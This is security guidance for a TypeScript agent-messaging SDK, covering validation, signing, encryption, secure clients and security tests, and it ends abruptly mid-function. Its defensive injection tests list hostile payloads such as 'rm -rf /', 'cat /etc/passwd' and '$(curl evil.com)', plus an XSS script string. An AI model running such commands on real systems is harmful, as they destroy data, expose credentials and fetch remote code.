# Security Documentation - AMP TypeScript SDK

## Overview

This document provides comprehensive security guidance for the Agent Mesh Protocol (AMP) TypeScript/JavaScript SDK. It covers secure implementation practices, npm security, browser security considerations, and Node.js-specific security measures for building secure agent applications.

---

## TypeScript/JavaScript Security Best Practices

### Secure Development Environment

#### Node.js Environment Security
```bash
# Use Node Version Manager for consistent Node.js versions
nvm install 20.10.0  # Use latest LTS version
nvm use 20.10.0

# Verify Node.js version supports security features
node --version  # Should be 18.x+ for modern security features

# Enable npm audit for vulnerability scanning
npm audit
npm audit fix

# Use npm ci for reproducible installations
npm ci
```

#### Package.json Security Configuration
```json
{
  "name": "amp-typescript-sdk",
  "version": "1.0.0",
  "engines": {
    "node": ">=18.0.0",
    "npm": ">=9.0.0"
  },
  "dependencies": {
    "zod": "^3.22.4",
    "jose": "^5.2.0",
    "ws": "^8.16.0",
    "undici": "^6.6.0"
  },
  "devDependencies": {
    "@typescript-eslint/eslint-plugin": "^6.18.1",
    "@typescript-eslint/parser": "^6.18.1", 
    "eslint-plugin-security": "^2.1.0",
    "semgrep": "^1.45.0",
    "@types/node": "^20.11.5",
    "typescript": "^5.3.3"
  },
  "scripts": {
    "security:audit": "npm audit --audit-level=moderate",
    "security:scan": "semgrep --config=auto src/",
    "security:lint": "eslint src/ --ext .ts,.js",
    "build": "tsc",
    "test": "jest",
    "test:security": "jest tests/security/"
  }
}
```

### Type-Safe Message Validation

#### Zod Schema Validation
```typescript
import { z } from 'zod';

// Message validation schemas
const AgentIdentifierSchema = z.object({
  agent_id: z.string()
    .min(1, "Agent ID required")
    .max(128, "Agent ID too long")
    .regex(/^[a-zA-Z0-9\-_\.]+$/, "Invalid agent ID format"),
  session_id: z.string()
    .max(64, "Session ID too long")
    .optional(),
  capability: z.string()
    .max(64, "Capability name too long")
    .optional()
});

const MessageHeadersSchema = z.object({
  correlation_id: z.string().optional(),
  priority: z.number().int().min(1).max(10).default(5),
  timeout_ms: z.number().int().min(1000).max(300000).default(30000),
  authentication: z.object({
    type: z.enum(['jwt', 'api_key', 'mtls', 'hmac']),
    credentials: z.string()
  }).optional(),
  signature: z.object({
    algorithm: z.enum(['HMAC-SHA256', 'RSA-SHA256', 'ECDSA-SHA256']),
    value: z.string()
  }).optional()
});

const MessageContentSchema = z.object({
  id: z.string()
    .min(1, "Message ID required")
    .max(64, "Message ID too long")
    .regex(/^[a-zA-Z0-9\-_]+$/, "Invalid message ID format"),
  type: z.enum(['request', 'response', 'event', 'error']),
  timestamp: z.string()
    .regex(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/, "Invalid timestamp format"),
  source: AgentIdentifierSchema,
  destination: AgentIdentifierSchema.optional(),
  headers: MessageHeadersSchema.default({}),
  payload: z.record(z.any()).refine(
    (payload) => {
      // Validate payload size (1MB limit)
      const payloadSize = JSON.stringify(payload).length;
      return payloadSize <= 1024 * 1024;
    },
    { message: "Payload exceeds 1MB limit" }
  )
});

const AMPMessageSchema = z.object({
  protocol: z.string().regex(/^AMP\/\d+\.\d+$/, "Invalid protocol format"),
  message: MessageContentSchema
});

// Type definitions from schemas
export type AgentIdentifier = z.infer<typeof AgentIdentifierSchema>;
export type MessageHeaders = z.infer<typeof MessageHeadersSchema>;
export type MessageContent = z.infer<typeof MessageContentSchema>;
export type AMPMessage = z.infer<typeof AMPMessageSchema>;

// Validation functions
export function validateAMPMessage(data: unknown): AMPMessage {
  try {
    return AMPMessageSchema.parse(data);
  } catch (error) {
    if (error instanceof z.ZodError) {
      throw new ValidationError(`Invalid AMP message: ${error.message}`);
    }
    throw new ValidationError('Failed to validate AMP message');
  }
}

export function sanitizeMessagePayload(payload: Record<string, any>): Record<string, any> {
  const sanitized: Record<string, any> = {};
  
  for (const [key, value] of Object.entries(payload)) {
    // Sanitize keys
    const sanitizedKey = key.replace(/[^\w\-_]/g, '');
    
    if (typeof value === 'string') {
      // Basic XSS prevention
      sanitized[sanitizedKey] = value
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
    } else if (typeof value === 'object' && value !== null) {
      // Recursively sanitize nested objects
      sanitized[sanitizedKey] = sanitizeMessagePayload(value);
    } else {
      sanitized[sanitizedKey] = value;
    }
  }
  
  return sanitized;
}
```

### Cryptographic Security

#### JWT Token Management
```typescript
import { SignJWT, jwtVerify, JWTPayload } from 'jose';
import { createHash, randomBytes } from 'node:crypto';

export interface AMPJWTPayload extends JWTPayload {
  agent_id: string;
  capabilities: string[];
  session_id?: string;
}

export class JWTManager {
  private secret: Uint8Array;
  private algorithm = 'HS256';
  
  constructor(secretKey: string) {
    if (secretKey.length < 32) {
      throw new Error('JWT secret key must be at least 32 characters');
    }
    this.secret = new TextEncoder().encode(secretKey);
  }
  
  async generateToken(
    agentId: string, 
    capabilities: string[], 
    expiresIn: number = 3600
  ): Promise<string> {
    const payload: AMPJWTPayload = {
      agent_id: agentId,
      capabilities,
      iss: 'amp-typescript-sdk',
      aud: 'amp-mesh',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + expiresIn
    };
    
    return await new SignJWT(payload)
      .setProtectedHeader({ alg: this.algorithm })
      .sign(this.secret);
  }
  
  async verifyToken(token: string): Promise<AMPJWTPayload | null> {
    try {
      const { payload } = await jwtVerify(token, this.secret, {
        issuer: 'amp-typescript-sdk',
        audience: 'amp-mesh'
      });
      
      // Validate required fields
      if (!payload.agent_id || !Array.isArray(payload.capabilities)) {
        throw new Error('Invalid token payload');
      }
      
      return payload as AMPJWTPayload;
    } catch (error) {
      console.warn('JWT verification failed:', error instanceof Error ? error.message : 'Unknown error');
      return null;
    }
  }
}
```

#### Message Signing and Verification
```typescript
import { createHmac, createHash } from 'node:crypto';
import { webcrypto } from 'node:crypto';

export class MessageSigner {
  private secretKey: string;
  
  constructor(secretKey: string) {
    this.secretKey = secretKey;
  }
  
  async signMessageHMAC(message: AMPMessage): Promise<string> {
    // Create canonical message representation
    const canonicalMessage = JSON.stringify(message.message, Object.keys(message.message).sort());
    
    // Generate HMAC signature
    const hmac = createHmac('sha256', this.secretKey);
    hmac.update(canonicalMessage, 'utf8');
    return hmac.digest('hex');
  }
  
  async verifyMessageHMAC(message: AMPMessage, signature: string): Promise<boolean> {
    try {
      const expectedSignature = await this.signMessageHMAC(message);
      
      // Use constant-time comparison to prevent timing attacks
      return this.constantTimeCompare(signature, expectedSignature);
    } catch (error) {
      console.error('HMAC verification failed:', error);
      return false;
    }
  }
  
  private constantTimeCompare(a: string, b: string): boolean {
    if (a.length !== b.length) {
      return false;
    }
    
    let result = 0;
    for (let i = 0; i < a.length; i++) {
      result |= a.charCodeAt(i) ^ b.charCodeAt(i);
    }
    
    return result === 0;
  }
  
  async signMessageRSA(message: AMPMessage, privateKey: CryptoKey): Promise<string> {
    const canonicalMessage = JSON.stringify(message.message, Object.keys(message.message).sort());
    const encoder = new TextEncoder();
    const data = encoder.encode(canonicalMessage);
    
    const signature = await webcrypto.subtle.sign(
      {
        name: 'RSA-PSS',
        saltLength: 32
      },
      privateKey,
      data
    );
    
    return Buffer.from(signature).toString('base64');
  }
  
  async verifyMessageRSA(message: AMPMessage, signature: string, publicKey: CryptoKey): Promise<boolean> {
    try {
      const canonicalMessage = JSON.stringify(message.message, Object.keys(message.message).sort());
      const encoder = new TextEncoder();
      const data = encoder.encode(canonicalMessage);
      const signatureBuffer = Buffer.from(signature, 'base64');
      
      return await webcrypto.subtle.verify(
        {
          name: 'RSA-PSS',
          saltLength: 32
        },
        publicKey,
        signatureBuffer,
        data
      );
    } catch (error) {
      console.error('RSA signature verification failed:', error);
      return false;
    }
  }
}
```

#### Encryption for Sensitive Data
```typescript
import { webcrypto } from 'node:crypto';

export class DataEncryption {
  async generateEncryptionKey(): Promise<CryptoKey> {
    return await webcrypto.subtle.generateKey(
      {
        name: 'AES-GCM',
        length: 256
      },
      true,
      ['encrypt', 'decrypt']
    );
  }
  
  async encryptData(data: string, key: CryptoKey): Promise<string> {
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(data);
    
    // Generate random IV
    const iv = webcrypto.getRandomValues(new Uint8Array(12));
    
    const encrypted = await webcrypto.subtle.encrypt(
      {
        name: 'AES-GCM',
        iv: iv
      },
      key,
      dataBuffer
    );
    
    // Combine IV and encrypted data
    const combined = new Uint8Array(iv.length + encrypted.byteLength);
    combined.set(iv);
    combined.set(new Uint8Array(encrypted), iv.length);
    
    return Buffer.from(combined).toString('base64');
  }
  
  async decryptData(encryptedData: string, key: CryptoKey): Promise<string> {
    try {
      const combined = Buffer.from(encryptedData, 'base64');
      
      // Extract IV and encrypted data
      const iv = combined.slice(0, 12);
      const encrypted = combined.slice(12);
      
      const decrypted = await webcrypto.subtle.decrypt(
        {
          name: 'AES-GCM',
          iv: iv
        },
        key,
        encrypted
      );
      
      const decoder = new TextDecoder();
      return decoder.decode(decrypted);
    } catch (error) {
      throw new Error('Failed to decrypt data');
    }
  }
}
```

### Network Security

#### Secure HTTP Client
```typescript
import { fetch } from 'undici';

export interface SecureClientOptions {
  baseURL: string;
  apiKey?: string;
  timeout?: number;
  maxRedirects?: number;
  verifySSL?: boolean;
}

export class SecureAMPClient {
  private baseURL: string;
  private apiKey?: string;
  private timeout: number;
  private verifySSL: boolean;
  
  constructor(options: SecureClientOptions) {
    this.baseURL = options.baseURL;
    this.apiKey = options.apiKey;
    this.timeout = options.timeout || 30000;
    this.verifySSL = options.verifySSL !== false; // Default to true
    
    // Validate URL is HTTPS in production
    if (!this.baseURL.startsWith('https://') && 
        !this.baseURL.startsWith('http://localhost') &&
        !this.baseURL.startsWith('http://127.0.0.1')) {
      throw new Error('Only HTTPS URLs allowed in production');
    }
  }
  
  async sendMessage(message: AMPMessage): Promise<AMPMessage> {
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      'User-Agent': 'AMP-TypeScript-SDK/1.0.0'
    };
    
    if (this.apiKey) {
      headers['Authorization'] = `Bearer ${this.apiKey}`;
    }
    
    try {
      const response = await fetch(`${this.baseURL}/messages`, {
        method: 'POST',
        headers,
        body: JSON.stringify(message),
        signal: AbortSignal.timeout(this.timeout)
      });
      
      if (!response.ok) {
        throw new AMPError(`HTTP ${response.status}: ${response.statusText}`);
      }
      
      const responseData = await response.json();
      return validateAMPMessage(responseData);
      
    } catch (error) {
      if (error instanceof Error) {
        if (error.name === 'AbortError') {
          throw new AMPError('Request timeout');
        }
        throw new AMPError(`Request failed: ${error.message}`);
      }
      throw new AMPError('Unknown request error');
    }
  }
}
```

#### Secure WebSocket Client
```typescript
import WebSocket from 'ws';
import { EventEmitter } from 'node:events';

export interface SecureWebSocketOptions {
  url: string;
  apiKey?: string;
  pingInterval?: number;
  maxReconnectAttempts?: number;
}

export class SecureWebSocketClient extends EventEmitter {
  private url: string;
  private apiKey?: string;
  private pingInterval: number;
  private maxReconnectAttempts: number;
  private ws?: WebSocket;
  private reconnectAttempts = 0;
  private isConnecting = false;
  
  constructor(options: SecureWebSocketOptions) {
    super();
    
    this.url = options.url;
    this.apiKey = options.apiKey;
    this.pingInterval = options.pingInterval || 30000;
    this.maxReconnectAttempts = options.maxReconnectAttempts || 5;
    
    // Validate secure WebSocket URL
    if (!this.url.startsWith('wss://') && 
        !this.url.startsWith('ws://localhost') &&
        !this.url.startsWith('ws://127.0.0.1')) {
      throw new Error('Only secure WebSocket (wss://) allowed in production');
    }
  }
  
  async connect(): Promise<void> {
    if (this.isConnecting || this.ws?.readyState === WebSocket.OPEN) {
      return;
    }
    
    this.isConnecting = true;
    
    const headers: Record<string, string> = {};
    if (this.apiKey) {
      headers['Authorization'] = `Bearer ${this.apiKey}`;
    }
    
    try {
      this.ws = new WebSocket(this.url, {
        headers,
        handshakeTimeout: 10000,
        maxPayload: 1024 * 1024 // 1MB limit
      });
      
      this.setupEventHandlers();
      
      // Wait for connection
      await new Promise<void>((resolve, reject) => {
        const timeout = setTimeout(() => {
          reject(new Error('WebSocket connection timeout'));
        }, 10000);
        
        this.ws!.once('open', () => {
          clearTimeout(timeout);
          resolve();
        });
        
        this.ws!.once('error', (error) => {
          clearTimeout(timeout);
          reject(error);
        });
      });
      
      this.isConnecting = false;
      this.reconnectAttempts = 0;
      this.emit('connected');
      
    } catch (error) {
      this.isConnecting = false;
      this.handleConnectionError(error);
    }
  }
  
  private setupEventHandlers(): void {
    if (!this.ws) return;
    
    this.ws.on('message', (data: WebSocket.RawData) => {
      try {
        const message = JSON.parse(data.toString());
        const validatedMessage = validateAMPMessage(message);
        this.emit('message', validatedMessage);
      } catch (error) {
        console.warn('Invalid message received:', error);
        this.emit('error', new Error('Invalid message format'));
      }
    });
    
    this.ws.on('close', (code: number, reason: Buffer) => {
      this.emit('disconnected', { code, reason: reason.toString() });
      this.attemptReconnect();
    });
    
    this.ws.on('error', (error: Error) => {
      this.emit('error', error);
    });
    
    // Setup ping/pong for connection health
    const pingTimer = setInterval(() => {
      if (this.ws?.readyState === WebSocket.OPEN) {
        this.ws.ping();
      }
    }, this.pingInterval);
    
    this.ws.once('close', () => {
      clearInterval(pingTimer);
    });
  }
  
  private async attemptReconnect(): Promise<void> {
    if (this.reconnectAttempts >= this.maxReconnectAttempts) {
      this.emit('maxReconnectAttemptsReached');
      return;
    }
    
    this.reconnectAttempts++;
    const delay = Math.min(1000 * Math.pow(2, this.reconnectAttempts), 30000);
    
    setTimeout(() => {
      this.connect().catch((error) => {
        this.handleConnectionError(error);
      });
    }, delay);
  }
  
  private handleConnectionError(error: unknown): void {
    console.error('WebSocket connection error:', error);
    this.emit('error', error instanceof Error ? error : new Error('Unknown connection error'));
  }
  
  async sendMessage(message: AMPMessage): Promise<void> {
    if (this.ws?.readyState !== WebSocket.OPEN) {
      throw new Error('WebSocket not connected');
    }
    
    try {
      const serialized = JSON.stringify(message);
      this.ws.send(serialized);
    } catch (error) {
      throw new Error(`Failed to send message: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }
  
  disconnect(): void {
    if (this.ws) {
      this.ws.close(1000, 'Client disconnect');
      this.ws = undefined;
    }
  }
}
```

### Browser Security Considerations

#### Content Security Policy (CSP)
```typescript
// For browser environments - CSP configuration
export const CSP_DIRECTIVES = {
  'default-src': ["'self'"],
  'script-src': ["'self'", "'unsafe-inline'"], // Minimize unsafe-inline usage
  'style-src': ["'self'", "'unsafe-inline'"],
  'img-src': ["'self'", "data:", "https:"],
  'connect-src': ["'self'", "wss:", "https:"],
  'font-src': ["'self'"],
  'object-src': ["'none'"],
  'base-uri': ["'self'"],
  'form-action': ["'self'"],
  'frame-ancestors': ["'none'"],
  'upgrade-insecure-requests': []
};

// CSP header generation
export function generateCSPHeader(directives: Record<string, string[]> = CSP_DIRECTIVES): string {
  return Object.entries(directives)
    .map(([directive, sources]) => `${directive} ${sources.join(' ')}`)
    .join('; ');
}
```

#### XSS Prevention
```typescript
export class XSSProtection {
  static sanitizeHTML(input: string): string {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');
  }
  
  static sanitizeURL(url: string): string {
    try {
      const parsed = new URL(url);
      
      // Only allow HTTP(S) and WebSocket protocols
      if (!['http:', 'https:', 'ws:', 'wss:'].includes(parsed.protocol)) {
        throw new Error('Invalid protocol');
      }
      
      return parsed.toString();
    } catch {
      throw new Error('Invalid URL format');
    }
  }
  
  static validateOrigin(origin: string, allowedOrigins: string[]): boolean {
    return allowedOrigins.includes(origin) || allowedOrigins.includes('*');
  }
}

// Browser environment detection and security
export class BrowserSecurity {
  static isSecureContext(): boolean {
    return typeof window !== 'undefined' && window.isSecureContext;
  }
  
  static enforceSecureContext(): void {
    if (typeof window !== 'undefined' && !window.isSecureContext) {
      throw new Error('AMP SDK requires a secure context (HTTPS)');
    }
  }
  
  static setupSecurityHeaders(): void {
    if (typeof document !== 'undefined') {
      // Add security meta tags
      const securityMetas = [
        { name: 'referrer', content: 'strict-origin-when-cross-origin' },
        { 'http-equiv': 'X-Content-Type-Options', content: 'nosniff' },
        { 'http-equiv': 'X-Frame-Options', content: 'DENY' },
        { 'http-equiv': 'X-XSS-Protection', content: '1; mode=block' }
      ];
      
      securityMetas.forEach(meta => {
        if (!document.querySelector(`meta[name="${meta.name}"], meta[http-equiv="${meta['http-equiv']}"]`)) {
          const element = document.createElement('meta');
          Object.assign(element, meta);
          document.head.appendChild(element);
        }
      });
    }
  }
}
```

---

## Dependency Security

### NPM Security Configuration
```json
{
  "name": "amp-typescript-sdk",
  "scripts": {
    "preinstall": "npx check-node-version --node '>= 18.0.0' --npm '>= 9.0.0'",
    "postinstall": "npm audit --audit-level=moderate",
    "security:audit": "npm audit --audit-level=moderate --json",
    "security:update": "npm update --save",
    "security:outdated": "npm outdated",
    "security:check": "npm run security:audit && npm run security:scan"
  },
  "overrides": {
    "semver": ">=7.5.4",
    "word-wrap": ">=1.2.4"
  }
}
```

### Automated Security Scanning
```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
          
      - name: Install dependencies
        run: npm ci
        
      - name: Run npm audit
        run: npm audit --audit-level=moderate
        
      - name: Run CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          languages: typescript
          
      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: auto
          
      - name: Run ESLint Security
        run: npx eslint src/ --ext .ts,.js --config .eslintrc.security.js
```

### ESLint Security Configuration
```javascript
// .eslintrc.security.js
module.exports = {
  extends: [
    '@typescript-eslint/recommended',
    'plugin:security/recommended'
  ],
  plugins: ['security', '@typescript-eslint'],
  rules: {
    // Security rules
    'security/detect-object-injection': 'error',
    'security/detect-non-literal-regexp': 'error',
    'security/detect-unsafe-regex': 'error',
    'security/detect-buffer-noassert': 'error',
    'security/detect-child-process': 'error',
    'security/detect-disable-mustache-escape': 'error',
    'security/detect-eval-with-expression': 'error',
    'security/detect-no-csrf-before-method-override': 'error',
    'security/detect-non-literal-fs-filename': 'error',
    'security/detect-non-literal-require': 'error',
    'security/detect-possible-timing-attacks': 'error',
    'security/detect-pseudoRandomBytes': 'error',
    
    // TypeScript security rules
    '@typescript-eslint/no-explicit-any': 'warn',
    '@typescript-eslint/no-non-null-assertion': 'error',
    '@typescript-eslint/prefer-nullish-coalescing': 'error',
    '@typescript-eslint/prefer-optional-chain': 'error',
    
    // General security practices
    'no-eval': 'error',
    'no-implied-eval': 'error',
    'no-new-func': 'error',
    'no-script-url': 'error'
  }
};
```

---

## Error Handling and Logging

### Secure Error Handling
```typescript
export enum AMPErrorCode {
  VALIDATION_ERROR = 'VALIDATION_ERROR',
  AUTHENTICATION_ERROR = 'AUTHENTICATION_ERROR',
  AUTHORIZATION_ERROR = 'AUTHORIZATION_ERROR',
  NETWORK_ERROR = 'NETWORK_ERROR',
  SECURITY_ERROR = 'SECURITY_ERROR',
  RATE_LIMIT_ERROR = 'RATE_LIMIT_ERROR'
}

export class AMPError extends Error {
  public readonly code: AMPErrorCode;
  public readonly details?: Record<string, any>;
  public readonly timestamp: Date;
  
  constructor(
    message: string, 
    code: AMPErrorCode = AMPErrorCode.SECURITY_ERROR,
    details?: Record<string, any>
  ) {
    super(message);
    this.name = 'AMPError';
    this.code = code;
    this.details = details;
    this.timestamp = new Date();
    
    // Maintain proper stack trace
    if (Error.captureStackTrace) {
      Error.captureStackTrace(this, AMPError);
    }
  }
  
  toJSON(): Record<string, any> {
    return {
      name: this.name,
      message: this.message,
      code: this.code,
      timestamp: this.timestamp.toISOString(),
      // Don't include details in production to prevent information leakage
      ...(process.env.NODE_ENV === 'development' && { details: this.details })
    };
  }
}

export class SecurityErrorHandler {
  static handleAuthenticationError(error: unknown, context?: Record<string, any>): AMPError {
    this.logSecurityEvent('authentication_failed', { error: String(error), context });
    return new AMPError('Authentication failed', AMPErrorCode.AUTHENTICATION_ERROR);
  }
  
  static handleAuthorizationError(error: unknown, context?: Record<string, any>): AMPError {
    this.logSecurityEvent('authorization_failed', { error: String(error), context });
    return new AMPError('Insufficient permissions', AMPErrorCode.AUTHORIZATION_ERROR);
  }
  
  static handleValidationError(error: unknown, context?: Record<string, any>): AMPError {
    this.logSecurityEvent('validation_failed', { error: String(error), context });
    return new AMPError('Invalid input data', AMPErrorCode.VALIDATION_ERROR);
  }
  
  private static logSecurityEvent(eventType: string, details: Record<string, any>): void {
    const event = {
      timestamp: new Date().toISOString(),
      level: 'warn',
      eventType,
      details: process.env.NODE_ENV === 'development' ? details : undefined
    };
    
    console.warn('Security event:', event);
    
    // In production, send to monitoring system
    if (process.env.NODE_ENV === 'production') {
      // this.sendToMonitoring(event);
    }
  }
}
```

### Security Logging
```typescript
export interface SecurityEvent {
  timestamp: string;
  eventType: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  agentId?: string;
  sourceIP?: string;
  details?: Record<string, any>;
}

export class SecurityLogger {
  private events: SecurityEvent[] = [];
  private maxEvents = 1000;
  
  logAuthenticationAttempt(
    agentId: string, 
    success: boolean, 
    method: string, 
    sourceIP?: string
  ): void {
    this.addEvent({
      timestamp: new Date().toISOString(),
      eventType: 'authentication_attempt',
      severity: success ? 'low' : 'medium',
      agentId,
      sourceIP,
      details: { success, method }
    });
  }
  
  logCapabilityAccess(
    agentId: string, 
    capability: string, 
    authorized: boolean,
    context?: Record<string, any>
  ): void {
    this.addEvent({
      timestamp: new Date().toISOString(),
      eventType: 'capability_access',
      severity: authorized ? 'low' : 'high',
      agentId,
      details: { capability, authorized, context }
    });
  }
  
  logSecurityViolation(
    violationType: string, 
    severity: SecurityEvent['severity'],
    details: Record<string, any>
  ): void {
    this.addEvent({
      timestamp: new Date().toISOString(),
      eventType: 'security_violation',
      severity,
      details: { violationType, ...details }
    });
    
    // Immediate alert for critical violations
    if (severity === 'critical') {
      this.triggerSecurityAlert(violationType, details);
    }
  }
  
  private addEvent(event: SecurityEvent): void {
    this.events.push(event);
    
    // Maintain maximum event count
    if (this.events.length > this.maxEvents) {
      this.events.shift();
    }
    
    // Log to console in development
    if (process.env.NODE_ENV === 'development') {
      console.log('Security Event:', event);
    }
  }
  
  private triggerSecurityAlert(violationType: string, details: Record<string, any>): void {
    console.error('SECURITY ALERT:', { violationType, details, timestamp: new Date().toISOString() });
    
    // In production, send to alerting system
    if (process.env.NODE_ENV === 'production') {
      // this.sendAlert({ violationType, details });
    }
  }
  
  getEvents(filter?: Partial<SecurityEvent>): SecurityEvent[] {
    if (!filter) return [...this.events];
    
    return this.events.filter(event => {
      return Object.entries(filter).every(([key, value]) => 
        event[key as keyof SecurityEvent] === value
      );
    });
  }
}
```

---

## Testing Security

### Security Test Framework
```typescript
import { describe, it, expect, beforeEach, jest } from '@jest/globals';

describe('Security Tests', () => {
  let securityLogger: SecurityLogger;
  let jwtManager: JWTManager;
  let messageSigner: MessageSigner;
  
  beforeEach(() => {
    securityLogger = new SecurityLogger();
    jwtManager = new JWTManager('test-secret-key-32-characters-long');
    messageSigner = new MessageSigner('test-signing-key');
  });
  
  describe('Input Validation', () => {
    it('should reject malformed AMP messages', () => {
      const invalidMessage = {
        protocol: 'INVALID/1.0',
        message: {}
      };
      
      expect(() => validateAMPMessage(invalidMessage)).toThrow();
    });
    
    it('should reject oversized payloads', () => {
      const largePayload = { data: 'x'.repeat(1024 * 1024 + 1) };
      
      const message = {
        protocol: 'AMP/1.0',
        message: {
          id: 'test-123',
          type: 'request',
          timestamp: '2025-01-27T10:00:00Z',
          source: { agent_id: 'test-agent' },
          payload: largePayload
        }
      };
      
      expect(() => validateAMPMessage(message)).toThrow(/payload exceeds/i);
    });
    
    it('should sanitize XSS attempts', () => {
      const maliciousPayload = {
        name: '<script>alert("xss")</script>',
        description: 'javascript:void(0)'
      };
      
      const sanitized = sanitizeMessagePayload(maliciousPayload);
      
      expect(sanitized.name).not.toContain('<script>');
      expect(sanitized.name).toContain('&lt;script&gt;');
    });
  });
  
  describe('Authentication', () => {
    it('should generate and verify valid JWT tokens', async () => {
      const token = await jwtManager.generateToken('test-agent', ['capability1']);
      const payload = await jwtManager.verifyToken(token);
      
      expect(payload).toBeTruthy();
      expect(payload?.agent_id).toBe('test-agent');
      expect(payload?.capabilities).toContain('capability1');
    });
    
    it('should reject invalid JWT tokens', async () => {
      const payload = await jwtManager.verifyToken('invalid-token');
      expect(payload).toBeNull();
    });
    
    it('should reject expired JWT tokens', async () => {
      // Create token with very short expiration
      const token = await jwtManager.generateToken('test-agent', ['capability1'], 1);
      
      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 1100));
      
      const payload = await jwtManager.verifyToken(token);
      expect(payload).toBeNull();
    });
  });
  
  describe('Message Signing', () => {
    it('should sign and verify message signatures', async () => {
      const message: AMPMessage = {
        protocol: 'AMP/1.0',
        message: {
          id: 'test-123',
          type: 'request',
          timestamp: '2025-01-27T10:00:00Z',
          source: { agent_id: 'test-agent' },
          payload: { test: 'data' }
        }
      };
      
      const signature = await messageSigner.signMessageHMAC(message);
      const isValid = await messageSigner.verifyMessageHMAC(message, signature);
      
      expect(isValid).toBe(true);
    });
    
    it('should detect message tampering', async () => {
      const message: AMPMessage = {
        protocol: 'AMP/1.0',
        message: {
          id: 'test-123',
          type: 'request',
          timestamp: '2025-01-27T10:00:00Z',
          source: { agent_id: 'test-agent' },
          payload: { test: 'data' }
        }
      };
      
      const signature = await messageSigner.signMessageHMAC(message);
      
      // Tamper with message
      message.message.payload.tampered = true;
      
      const isValid = await messageSigner.verifyMessageHMAC(message, signature);
      expect(isValid).toBe(false);
    });
  });
  
  describe('Rate Limiting', () => {
    it('should implement rate limiting', async () => {
      const rateLimiter = new RateLimiter(5, 1000); // 5 requests per second
      
      // First 5 requests should succeed
      for (let i = 0; i < 5; i++) {
        expect(rateLimiter.checkLimit('test-agent')).toBe(true);
      }
      
      // 6th request should fail
      expect(rateLimiter.checkLimit('test-agent')).toBe(false);
    });
  });
});

// Mock rate limiter for testing
class RateLimiter {
  private requests = new Map<string, number[]>();
  
  constructor(private maxRequests: number, private windowMs: number) {}
  
  checkLimit(identifier: string): boolean {
    const now = Date.now();
    const requests = this.requests.get(identifier) || [];
    
    // Remove old requests outside the window
    const validRequests = requests.filter(time => now - time < this.windowMs);
    
    if (validRequests.length >= this.maxRequests) {
      return false;
    }
    
    validRequests.push(now);
    this.requests.set(identifier, validRequests);
    return true;
  }
}
```

### Penetration Testing
```typescript
import { performance } from 'node:perf_hooks';

describe('Penetration Testing', () => {
  describe('Timing Attack Protection', () => {
    it('should use constant-time comparison for signatures', async () => {
      const messageSigner = new MessageSigner('test-key');
      const message: AMPMessage = {
        protocol: 'AMP/1.0',
        message: {
          id: 'test-123',
          type: 'request',
          timestamp: '2025-01-27T10:00:00Z',
          source: { agent_id: 'test-agent' },
          payload: {}
        }
      };
      
      const validSignature = await messageSigner.signMessageHMAC(message);
      const invalidSignature = 'invalid-signature-same-length-as-valid-one';
      
      // Measure timing for valid and invalid signatures
      const measurements: number[] = [];
      
      for (let i = 0; i < 100; i++) {
        const start = performance.now();
        await messageSigner.verifyMessageHMAC(message, 
          i % 2 === 0 ? validSignature : invalidSignature
        );
        const end = performance.now();
        measurements.push(end - start);
      }
      
      // Check that timing variance is minimal (indicating constant-time comparison)
      const validTimes = measurements.filter((_, i) => i % 2 === 0);
      const invalidTimes = measurements.filter((_, i) => i % 2 === 1);
      
      const validAvg = validTimes.reduce((a, b) => a + b) / validTimes.length;
      const invalidAvg = invalidTimes.reduce((a, b) => a + b) / invalidTimes.length;
      
      // Times should be similar (within 10% variance)
      const variance = Math.abs(validAvg - invalidAvg) / Math.max(validAvg, invalidAvg);
      expect(variance).toBeLessThan(0.1);
    });
  });
  
  describe('Injection Attack Protection', () => {
    it('should prevent command injection', () => {
      const injectionPayloads = [
        '; ls -la',
        '&& rm -rf /',
        '| cat /etc/passwd',
        '$(curl evil.com)',
        '`whoami`'
      ];
      
      for (const payload of injectionPayloads) {
        expect(() => {
          validateAMPMessage({
            protocol: 'AMP/1.0',
            message: {
              id: payload,
              type: 'request',
              timestamp: '2025-01-27T10:00:00Z',
              source: { agent_id: 'test-agent' },
              payload: {}
            }
          });
        }).toThrow();
      }
    });
  });
  
  describe('DoS Protection', () => {
    it('should handle resource exhaustion attempts', async () => {
      const promises: Promise<any>[] = [];
      
      // Attempt to create many concurrent connections
      for (let i = 0; i < 1000; i++) {
        promises.push(
          new Promise(resolve => {
            try {
              const client = new SecureAMPClient({
                baseURL: 'https://test.example.com',
                timeout: 1000
              });
              resolve(client);
            } catch (error) {
              resolve(error);
            }
          })
        );
      }
      
      const results = await Promise.allSettled(promises);
      
      // Should handle gracefully without crashing
      expect(results.length).toBe(1000);
    });
  });
});
```

---

## Production Security Hardening

### Environment Configuration
```typescript
export interface SecurityConfig {
  nodeEnv: string;
  secretKey: string;
  jwtExpiration: number;
  rateLimitRequests: number;
  rateLimitWindow: number;
  sslVerify: boolean;
  corsOrigins: string[];
  logLevel: string;
}

export function loadSecurityConfig(): SecurityConfig {
  const config: SecurityConfig = {
    nodeEnv: process.env.NODE_ENV || 'development',
    secretKey: process.env.AMP_SECRET_KEY || '',
    jwtExpiration: parseInt(process.env.AMP_JWT_EXPIRATION || '3600'),
    rateLimitRequests: parseInt(process.env.AMP_RATE_LIMIT_REQUESTS || '100'),
    rateLimitWindow: parseInt(process.env.AMP_RATE_LIMIT_WINDOW || '60000'),
